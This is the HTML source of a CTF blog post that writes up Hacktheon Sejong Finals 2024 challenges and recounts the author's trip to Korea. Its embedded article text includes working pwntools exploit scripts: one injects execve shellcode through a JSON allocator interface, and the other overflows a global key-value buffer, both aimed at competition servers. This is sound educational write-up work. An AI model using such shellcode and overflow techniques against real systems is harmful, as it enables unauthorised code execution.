@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Hacktheon Sejong Finals 2024 | zeynarz</title>
+<meta name="keywords" content="pwn, writeups, blog">
+<meta name="description" content="writeups for hacktheon finals and my experience at korea">
+<meta name="author" content="">
+<link rel="canonical" href="https://zeynarz.github.io/posts/hacktheon_24/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css" integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U&#43;6hYRq/Ez/nm5vg=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://zeynarz.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zeynarz.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zeynarz.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zeynarz.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zeynarz.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-XHJYTREZSC"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-XHJYTREZSC', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="Hacktheon Sejong Finals 2024" />
+<meta property="og:description" content="writeups for hacktheon finals and my experience at korea" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://zeynarz.github.io/posts/hacktheon_24/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-27T18:28:54+08:00" />
+<meta property="article:modified_time" content="2024-06-27T18:28:54+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hacktheon Sejong Finals 2024"/>
+<meta name="twitter:description" content="writeups for hacktheon finals and my experience at korea"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zeynarz.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Hacktheon Sejong Finals 2024",
+      "item": "https://zeynarz.github.io/posts/hacktheon_24/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Hacktheon Sejong Finals 2024",
+  "name": "Hacktheon Sejong Finals 2024",
+  "description": "writeups for hacktheon finals and my experience at korea",
+  "keywords": [
+    "pwn", "writeups", "blog"
+  ],
+  "articleBody": " Overview Last week, I traveled to Sejong, South Korea with my Malaysian team Kopi Cincau (comprising of me, Kelzin, Firdaus, and Teng) to play in this year’s Hacktheon Sejong Finals (Advanced category).\nWe only managed to get #12 in the Advanced category, but it was a super tight ctf. The difference between us and first place were only 2 challanges. (We would’ve gotten #2 if we played in the beginner category!). It was a good experience overall, and I’m grateful for the opportunity to go there and play.\nThis post is going to be first writeups for some of the challenges I’ve solved/contributed in, and then its gonna be a short blog about my experience there.\nAll challenges and exploit scripts could be found here.\nThanks to Secure D and CyberWise for sponsoring the trip, and SherpaSec for supporting us too. Also thanks to Trailbl4z3r for helping us throughout the trip! The trip wouldn’t be possible without them.\nWriteups Interpreter 1 (rev) This was a C++ reversing challenge that I solved together with Teng. I didn’t want to work on this challenge at first since it was C++ reversing, but then Teng had some progress on it, and it seemed like quite a few teams have solved the challenge, so I hopped on the chall. We didn’t really solve this by reversing everything, but instead using dynamic analysis.\nThe challenge was an expression interpreter, and could process operators like +,-,*,/ The main function consisted of a lot of functions, but eventually Teng found the function which printed the flag, and also the check function to check if we have the correct input\n... uVar7 = FUN_00103f60(local_108,local_90); if ((uVar7 \u0026 1) != 0) { print_flag(); } ... Taking a look at the check function:\n// FUN_00103f60 __int64 __fastcall final_check(_QWORD *a1, _QWORD *a2) { v4 = op_shift_right(a1); if ( v4 == op_shift_right(a2) ) // check for expression { for ( i = 0LL; i \u003c 0x14; ++i ) { v3 = *(unsigned __int16 *)sub_4048B0(a1, i); if ( v3 != *(unsigned __int16 *)sub_4048B0(a2, i)) { // check two bytes at a time v6 = 0; return v6 \u0026 1; } } v6 = 1; } else { v6 = 0; } return v6 \u0026 1; } __int64 __fastcall op_shift_right(_QWORD *a1){ return (__int64)(a1[1] - *a1) \u003e\u003e 1; } __int64 __fastcall sub_4048B0(_QWORD *a1, __int64 a2){ return *a1 + 2 * a2; } Through gdb, we realised that **a2 is always the same, and that our input could manipulate the values in **a1, so we assumed that the aim is to make **a1 == **a2.\n0x555555557f60 ( $rdi = 0x00007fffffffe110 (a1) → 0x0000555555598820 → 0x0002800000018000, \u003c-|-- make them same $rsi = 0x00007fffffffe188 (a2) → 0x0000555555597ae0 → 0x0002800000038000 \u003c-| ) So first we have to pass the op_shift_right check, and to analyse that we breakpointed at the comparison of v4 == op_shift_right(a2)\n$rax : 0x8 $rcx : 0x14 → 0x555555557f9a cmp rax, rcx By playing around with different inputs and expressions, we found out that we could change the value of rax by passing in different combinations of + - * / in the expression.\nWe then were able to pass this check by using the input -123+122+232*12321/12312+12312\nNext up, it seems like the check function compares the bytes in a1 and a2 two bytes at a time. They check a total of 0x28 bytes. So what we did next was logically analyse what was inside a2 in the check function, and try to see how our expresssion is stored in memory.\nI noticed that the bytes seem to be in 2 bytes chunks, and since the check function also check two bytes at a time, I examined the memory 2 bytes at a time\n1+1 in memory 0x555555598360: 0x8000 0x0001 0x8000 0x0001 0x8010 1-1 in memory 0x555555598360: 0x8000 0x0001 0x8000 0x0001 0x8011 1*1 in memory 0x555555598360: 0x8000 0x0001 0x8000 0x0001 0x8012 1/1 in memory 0x555555598360: 0x8000 0x0001 0x8000 0x0001 0x8013 So we can see that numbers are stored in 2 bytes, in front of every number there is a 0x8000, and that +: 0x8010 -: 0x8011 *: 0x8012 /: 0x8013 Further analysing by chaining expressions\n1+2-3*4/5 in memory 0x555555597b10: 0x8000 0x0001 0x8000 0x0002 0x8010 0x8000 0x0003 0x8000 0x555555597b20: 0x0004 0x8012 0x8000 0x0005 0x8013 0x8011 We then realised this is just an implementation of a stack machine, and that 0x8000 was just a push instruction, and 0x8011,0x8012,...just performs an operation on the top two values on the stack.\nSo now that we know how the expression is saved in memory, we can look at the expression that is compared, and try to mimic that expression.\n0x8000 0x0003 0x8000 0x0002 0x8000 0x0005 0x8012 0x8000 0x0004 0x8011 0x8010 0x8000 0x0007 0x8000 0x0006 0x8000 0x0003 0x8013 0x8012 0x8010 Reversing this expression using the info above, we can deduce that the final expression should be (3+((2*5)-4))+(7*(6/3)).\nsimpllocator (pwn) There is a python file which loads a library ELF file called simpllocator.so. and allows us to interact with the functions of the library by sending json data\nfrom socket import * import json import ctypes import base64 lib = './simpllocator.so' funcs = ctypes.cdll.LoadLibrary(lib) print(funcs) # void init() init = funcs.init # int allocate() allocate = funcs.allocate allocate.restype = ctypes.c_int # prob is return type # int insert(fd, ptr, sz) insert = funcs.insert insert.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int8), ctypes.c_int] # prob is argument type insert.restype = ctypes.c_int # int delete(fd) delete = funcs.delete delete.argtypes = [ctypes.c_int] delete.restype = ctypes.c_int # int mprotect(fd, flag) mprotect = funcs.fd_mprotect mprotect.argtypes = [ctypes.c_int, ctypes.c_int] mprotect.restype = ctypes.c_int # int execute(fd) execute = funcs.execute execute.argtypes = [ctypes.c_int] execute.restype = ctypes.c_int def parse_args(args): res = list() for arg in args: # in json data, have to mention type also type = arg['type'] data = arg['data'] if type == 'INT': data = ctypes.c_int(arg['data']) elif type == 'PTR': decoded = base64.b64decode(arg['data']) data = {'data' : (ctypes.c_int8 * len(decoded))(*decoded), 'len' : ctypes.c_int(len(decoded))} else: return None res.append(data) return res init() print(\"Hello! This is Simpllocator!\") while True: argc = 0 args = None received = input() try: received = json.loads(received) callNum = received['callNum'] if received['args'] is not None: argc = len(received['args']) args = received['args'] if callNum == 1: if argc != 0: continue print(f\"fd[{allocate()}] created.\") # allocate is called here elif callNum == 2: if argc != 2 or received['args'][0]['type'] != 'INT': continue c_args = parse_args(args) if c_args is not None: if 0 \u003c= insert(c_args[0], c_args[1]['data'],c_args[1]['len']): # !!! the 2nd arg is just a string print(f\"Data inserted at fd[{received['args'][0]['data']}]\") elif callNum == 3: if argc != 1 or received['args'][0]['type'] != 'INT': continue c_args = parse_args(args) if 0 \u003c= delete(c_args[0]): print(f\"fd[{received['args'][0]['data']}] was deleted.\") elif callNum == 4: if argc != 2 or received['args'][0]['type'] != 'INT' or received['args'][1]['type'] != 'INT': continue c_args = parse_args(args) if 0 \u003c= mprotect(c_args[0], c_args[1]): print(f\"fd[{received['args'][0]['data']}] permission changed.\") elif callNum == 5: if argc != 1 or received['args'][0]['type'] != 'INT': continue c_args = parse_args(args) if 0 \u003c= execute(c_args[0]): print(f\"fd[{received['args'][0]['data']}] was executed.\") except: so how you interact with the functions is by sending json data like:\n{ \"callNum\": ..., \"args\": [ { \"type\": \"...\", \"data\": ... }, { \"type\": \"...\", \"data\": ... } ] } taking a look at the library functions:\nint init(EVP_PKEY_CTX *ctx){ setvbuf(stdin,(char *)0x0,2,0); setvbuf(stdout,(char *)0x0,2,0); setvbuf(stderr,(char *)0x0,2,0); pagesize = sysconf(0x1e); return 0x1040f0; } void allocate(void){ undefined4 *__s; __s = (undefined4 *)malloc(pagesize); memset(__s,0,pagesize); *__s = 1; createfd(__s); return; } int createfd(undefined8 param_1){ int idx; idx = 0; while( true ) { if (9 \u003c idx) { return -1; } if (*(fds + idx * 8) == 0) break; // fds is a global variable idx = idx + 1; } *(fds + idx * 8) = param_1; return idx; } undefined8 insert(uint param_1,void *param_2,uint param_3){ undefined8 uVar1; if (*(long *)(fds + (ulong)param_1 * 8) == 0) { uVar1 = 0xffffffff; } else { if (pagesize - 4 \u003c param_3) { uVar1 = 0xffffffff; } else { memcpy((*(fds + param_1 * 8) + 4),param_2,param_3); uVar1 = 0; } } return uVar1; } int fd_mprotect(int param_1,int param_2){ undefined4 *chunkPtr; int iVar2; chunkPtr = *(fds + (long)param_1 * 8); if (chunkPtr == (undefined4 *)0x0) { iVar2 = -1; } else { if (param_2 == 1) { iVar2 = mprotect((chunkPtr \u0026 -pagesize),pagesize,3); *chunkPtr = 1; } else { if (param_2 == 2) { iVar2 = mprotect((void *)((ulong)chunkPtr \u0026 -pagesize),pagesize * 2,7); // makes it executable? *chunkPtr = 2; } else { iVar2 = -1; } } } return iVar2; } undefined8 execute(int param_1,undefined8 param_2){ int *piVar1; undefined8 uVar2; piVar1 = *(int **)(fds + (long)param_1 * 8); if (piVar1 == (int *)0x0) { uVar2 = 0xffffffff; } else { if (*piVar1 == 2) { // execute shellcode starting from second byte (*(piVar1 + 1))(param_1,param_2,piVar1 + 1); uVar2 = 0; } else { uVar2 = 0xffffffff; } } return uVar2; } undefined8 delete(uint param_1){ int *__ptr; undefined8 uVar1; __ptr = *(int **)(fds + (ulong)param_1 * 8); if (__ptr == (int *)0x0) { uVar1 = 0xffffffff; } else { if (*__ptr != 1) { fd_mprotect(param_1,2); } free(__ptr); *(undefined8 *)(fds + (ulong)param_1 * 8) = 0; uVar1 = 0; } return uVar1; } reversing the functions is just:\nalloc() allows us to allocate a page mprotect() allows to change permissions of the page insert() allows us to write to the page execute() allows us to execute instructions in the page So what we can literally do is just allocate a page, write shellcode to the page, make the page executable, and execute it. Simple as that.\nWe just have to send the json data correctly to invoke the calls.\nI wasted a lot of time on this challenge because I understood the insert function wrongly, and thought that it takes in a ptr, and copies input from the ptr into the page. But it actually just takes in raw bytes (which is stored in the form of a string), and the bytes are just copied to the page. So yeah I overcomplicated it.\nfrom pwn import * import json import base64 #io = process([\"python3\",\"simpllocator.py\"],aslr=False) io = remote(b\"hto2024-finals-nlb-9fcbd7ce07567668.elb.ap-northeast-2.amazonaws.com\",17935) def alloc(): a = {\"callNum\": 1, \"args\": None} io.sendline(json.dumps(a)) def insert(idx,payload): a = { \"callNum\": 2, \"args\": [ { \"type\": \"INT\", \"data\": idx }, { \"type\": \"PTR\", \"data\": base64.b64encode(payload).decode()} ] } io.sendline(json.dumps(a)) def mprotect(idx,permission): a = { \"callNum\": 4, \"args\": [ { \"type\": \"INT\", \"data\": idx }, { \"type\": \"INT\", \"data\": permission} ] } io.sendline(json.dumps(a)) def execute(idx): a = { \"callNum\": 5, \"args\": [ { \"type\": \"INT\", \"data\": idx }, ] } io.sendline(json.dumps(a)) sc = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" alloc() mprotect(0,2) insert(0,sc) execute(0) io.interactive() Dict (pwn) The binary is just a simple dictionary / key-value store.\nThis is Simple Dictionary 1. Insert 2. Find 3. Exit \u003e 1 Key \u003e ABAB Value \u003e CDCD Insert success There is a checkflag() function which is called every loop.\nvoid main(void){ setup(); puts(\"This is Simple Dictionary\"); do { main_loop(); checkflag(); } while( true ); } void checkflag(void){ local_10 = *(long *)(in_FS_OFFSET + 0x28); if (DAT_00105080 == 0x31337) { __fd = open(\"flag\",0); ... read(__fd,\u0026local_58,0x40); printf(\"Flag: %s\\n\",\u0026local_58); } } return; } So to get the flag, we just have to overwrite DAT_00105080 to 0x31337.\nI was guessing that the key-values were probably just stored in the global variables memory region, and we could just somehow overwrite DAT_00105080 from there.\nTo test this, we can just:\ngef➤ search-pattern ABAB [+] Searching 'ABAB' in memory [+] In '/home/vagrant/ctf/hacktheon_finals24/dict/dict'(0x555555558000-0x555555559000), permission=rw- 0x555555558081 - 0x55555555808e → \"ABAB\\n=CDCD\\n\" gef➤ x/s 0x555555558080 0x555555558080:\t\",ABAB\\n=CDCD\\n\" and the data we’re trying to overwrite is at 0x0000555555559080.\nSo yeah, assuming that there is no limit for the amount of key-values we can make / the limit is large enough, we can just make 0x1000 bytes worth of key-values and then write 0x31337.\nLooking at the function that reads the key-values:\nint * FUN_00101375(void){ ... printf(\"Key \u003e \"); sVar3 = read(0,\u0026local_b8,0x20); ... printf(\"Value \u003e \"); sVar3 = read(0,\u0026local_98,0x80); ... } The max amount of bytes a key can have (counting newline byte) is 0x20, and the max amount of bytes a value can have is 0x80. So we just have to make around 0x1000/(0x20+0x80) ~ 25 key-values, to overwrite the global variable that is checked for flag.\nIt seems that commas and equal signs are added to the key-value strings, also newline bytes are stored too, so we have to include them in our bytes calculation too.\nfrom pwn import * #io = process(\"./dict\") io = remote(b\"hto2024-finals-nlb-9fcbd7ce07567668.elb.ap-northeast-2.amazonaws.com\",26432) for i in range(25): io.sendlineafter(b\"\u003e \",b\"1\") io.sendlineafter(b\"Key \u003e\",b\"A\"*(0x20-2)) io.sendlineafter(b\"Value \u003e\",b\"B\"*(0x80-2)) io.sendlineafter(b\"\u003e \",b\"1\") io.sendlineafter(b\"Key \u003e\",b\"A\"*(0x20-2)) io.sendlineafter(b\"Value \u003e\",b\"B\"*(0x40-3)) io.sendlineafter(b\"\u003e \",b\"1\") io.sendlineafter(b\"Key \u003e\",p32(0x31337)) io.sendlineafter(b\"Value \u003e\",b\"pwn\") #gdb.attach(io) io.interactive() And that’s it for the writeups!\nThe challenges were pretty alright. I quite liked the interpreter 1 challenge (maybe cause we managed to solve it), but the difficulty for the two pwn challs might be a bit too low. There was another pwn chall that I didn’t write about and it had 0 solves, it was a hard C++ pwn chall that required you to exploit reference counting. So the jump of difficulty from the second pwn chall to the third was really huge.\nThere was also no crypto challs so our crypto player were just doing forensics lol.\nBut overall, the quality of the challs and infra was pretty good. Nice.\nExperience One of the best things about this trip is that I got to meet a lot of my friends that I’ve made in previous events! It was really fun seeing all of them for a second time (and third time for Faze), and catching up with everyone. I also got to make some new friends through them.\ngoing to ctf venue with team and SG friends\nThe hotel provided was really nice, and the organisers even provided us transport from Incheon Airport to Sejong. Everything went pretty smoothly so praise given to the organisers.\nBefore we went back to Malaysia, we also toured around myeongdong. We were just walking around the night streets, and we also visited a kpop store. Had quite a lot of fun.\nIt was pretty cool since I was just there last year when I went to Korea for codegate, and in my blog post about codegate, I wrote that I wished to go to more onsite finals. And now I’m here again because of another onsite final. So, pretty cool.\nConclusion Thanks so much to my teammates for making this a fun experience, and thanks again to the sponsors for making this trip possible. The organisers did a great job at providing everything, and were really easy to work with. Korea was also pretty nice, the food was pretty good, and everything is very clean.\nAlso thanks to all the friends I’ve met again there, hope we can meet up again soon!\nPhoto dump ",
+  "wordCount" : "2432",
+  "inLanguage": "en",
+  "datePublished": "2024-06-27T18:28:54+08:00",
+  "dateModified": "2024-06-27T18:28:54+08:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zeynarz.github.io/posts/hacktheon_24/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zeynarz",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zeynarz.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zeynarz.github.io/" accesskey="h" title="zeynarz (Alt + H)">zeynarz</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zeynarz.github.io/posts/" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zeynarz.github.io/tags/" title="tags">
+                    <span>tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zeynarz.github.io/aboutme/" title="about me">
+                    <span>about me</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zeynarz.github.io/search/" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://zeynarz.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://zeynarz.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Hacktheon Sejong Finals 2024
+    </h1>
+    <div class="post-meta"><span title='2024-06-27 18:28:54 +0800 +08'>June 27, 2024</span>&nbsp;·&nbsp;12 min
+
+</div>
+  </header> 
+  <div class="post-content"><p><img loading="lazy" src="/hacktheon_24/banner.png" alt=""  />
+</p>
+<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>Last week, I traveled to Sejong, South Korea with my Malaysian team Kopi Cincau (comprising of me, <a href="https://mechfrog88.github.io/">Kelzin</a>, <a href="https://vicevirus.github.io/posts/gcc-2024/">Firdaus</a>, and <a href="https://tzion0.github.io/">Teng</a>) to play in this year&rsquo;s Hacktheon Sejong Finals (Advanced category).</p>
+<p>We only managed to get #12 in the Advanced category, but it was a super tight ctf. The difference between us and first place were only 2 challanges. (We would&rsquo;ve gotten #2 if we played in the beginner category!). It was a good experience overall, and I&rsquo;m grateful for the opportunity to go there and play.</p>
+<p>This post is going to be first <a href="#writeups">writeups</a> for some of the challenges I&rsquo;ve solved/contributed in, and then its gonna be a short blog about my <a href="#experience">experience</a> there.</p>
+<p>All challenges and exploit scripts could be found <a href="https://github.com/Zeynarz/ctf/tree/main/hacktheon_finals24">here</a>.</p>
+<blockquote>
+<p>Thanks to Secure D and CyberWise for sponsoring the trip, and SherpaSec for supporting us too. Also thanks to Trailbl4z3r for helping us throughout the trip! The trip wouldn&rsquo;t be possible without them.</p>
+</blockquote>
+<h2 id="writeups">Writeups<a hidden class="anchor" aria-hidden="true" href="#writeups">#</a></h2>
+<h3 id="interpreter-1-rev">Interpreter 1 (rev)<a hidden class="anchor" aria-hidden="true" href="#interpreter-1-rev">#</a></h3>
+<p>This was a C++ reversing challenge that I solved together with <a href="https://tzion0.github.io/">Teng</a>. I didn&rsquo;t want to work on this challenge at first since it was C++ reversing, but then Teng had some progress on it, and it seemed like quite a few teams have solved the challenge, so I hopped on the chall. We didn&rsquo;t really solve this by reversing everything, but instead using dynamic analysis.</p>
+<p>The challenge was an expression interpreter, and could process operators like <code>+,-,*,/ </code></p>
+<p>The main function consisted of a lot of functions, but eventually Teng found the function which printed the flag, and also the check function to check if we have the correct input</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        ...
+</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_00103f60</span>(local_108,local_90);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((uVar7 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">print_flag</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        ...
+</span></span></code></pre></div><p>Taking a look at the check function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// FUN_00103f60
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">final_check</span>(_QWORD <span style="color:#f92672">*</span>a1, _QWORD <span style="color:#f92672">*</span>a2) {
+</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">op_shift_right</span>(a1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">==</span> <span style="color:#a6e22e">op_shift_right</span>(a2) ) <span style="color:#75715e">// check for expression
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x14</span>; <span style="color:#f92672">++</span>i ) {
+</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">sub_4048B0</span>(a1, i);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">sub_4048B0</span>(a2, i)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// check two bytes at a time
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> v6 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v6 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">op_shift_right</span>(_QWORD <span style="color:#f92672">*</span>a1){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">__int64</span>)(a1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> <span style="color:#f92672">*</span>a1) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_4048B0</span>(_QWORD <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">__int64</span> a2){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">*</span>a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> a2;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Through gdb, we realised that <code>**a2</code>  is always the same, and that our input could manipulate the values in <code>**a1</code>, so we assumed that the aim is to make <code>**a1 == **a2</code>.</p>
+<pre tabindex="0"><code>0x555555557f60 (
+   $rdi = 0x00007fffffffe110 (a1) → 0x0000555555598820 → 0x0002800000018000, &lt;-|-- make them same
+   $rsi = 0x00007fffffffe188 (a2) → 0x0000555555597ae0 → 0x0002800000038000  &lt;-|
+)
+</code></pre><p>So first we have to pass the <code>op_shift_right</code> check, and to analyse that we breakpointed at the comparison of <code>v4 == op_shift_right(a2)</code></p>
+<pre tabindex="0"><code>$rax   : 0x8 
+$rcx   : 0x14
+
+ → 0x555555557f9a                  cmp    rax, rcx
+</code></pre><p>By playing around with different inputs and expressions, we found out that we could change the value of rax by passing in different combinations of <code>+ - * /</code> in the expression.</p>
+<p>We then were able to pass this check by using the input <code>-123+122+232*12321/12312+12312</code></p>
+<p>Next up, it seems like the check function compares the bytes in <code>a1</code> and <code>a2</code> two bytes at a time. They check a total of 0x28 bytes. So what we did next was logically analyse what was inside <code>a2</code> in the check function, and try to see how our expresssion is stored in memory.</p>
+<p>I noticed that the bytes seem to be in 2 bytes chunks, and since the check function also check two bytes at a time, I examined the memory 2 bytes at a time</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>1+1 in memory
+</span></span><span style="display:flex;"><span>0x555555598360: 0x8000  0x0001  0x8000  0x0001  0x8010
+</span></span><span style="display:flex;"><span>
